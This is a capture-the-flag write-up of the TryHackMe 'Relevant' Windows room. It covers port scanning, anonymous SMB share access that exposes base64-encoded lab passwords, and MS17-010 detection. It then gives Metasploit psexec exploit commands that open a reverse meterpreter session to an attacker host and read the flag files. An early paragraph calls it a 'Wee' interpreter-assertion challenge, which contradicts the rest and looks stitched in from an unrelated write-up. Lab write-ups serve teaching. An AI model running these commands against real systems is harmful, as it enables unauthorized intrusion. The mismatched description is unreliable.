# Relevant

https://tryhackme.com/room/relevant

Penetration Testing Challenge
> Difficulty: Medium 

This is one of the [Wee](../Wee) challenges.

It's the third of 5 similar challenges revolving around breaking assertions
inside the interpreter source.

## Analysis

**nmap scan**

![nmap](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/nmap.png)
![nmap1](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/nmap1.png)

hmmm

```
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
let's check port ***80*** first.

**gobuster**

let's start with listing [-L]

![gobuster](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/gobuster.png)

hmm, well nothing..
next is checking smbclient on port ***139,445***

**smbclient**

![smb](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/smb.png)

checking all shares, ***nt4wrksv*** was accessible with `--no-pass` and by listing directories ***passwords.txt*** was found

![smb1](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/smb1.png)

cat passwords.txt ???
![smb2](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/smb2.png)
which is base64 encode, base64 -d returns

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```
further checking ***Bill*** isn't a valid user and ***Bob's*** password is wrong

![smb3](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/smb3.png)

let's further enum smb

**enum smb**

let's start with nmap scripts

```
nmap --script "safe or smb-enum-*" -p 445 10.10.188.250
```

![step2](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/step2.png)

woow, seems vulnerable to **CVE-2017-0143** ***smb-vuln-ms17-010***, let's check further for vulnerability with metasploit scanner "smb_ms17_010"

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.188.250
run
```
![step2_1](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/step2_1.png)

**LIKELY VULNERABLE** lesss gooo for exploitation......



## Exploitation

***Analysis: Vulnerable to MS17-010***
**solution**

let's use metasploit smb "ms17_010_psexec" exploit

```
use exploit/windows/smb/ms17_010_psexec
set LHOST 10.18.37.12
set RHOSTS 10.10.188.250
run
```
![step2_2](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/step2_2.png)

...and we got the meterpreter session, let's just simply switch to cmd.exe

```
execute -f cmd.exe -i -H
whoami
```
![step2_3](https://raw.githubusercontent.com/deathpicnic/CTF-writeups/main/files/Relevant/step2_3.png)

for flags...

```
more C:\Users\Bob\Desktop\user.txt
more C:\Users\Administrator\Desktop\root.txt
```

***it's the END***
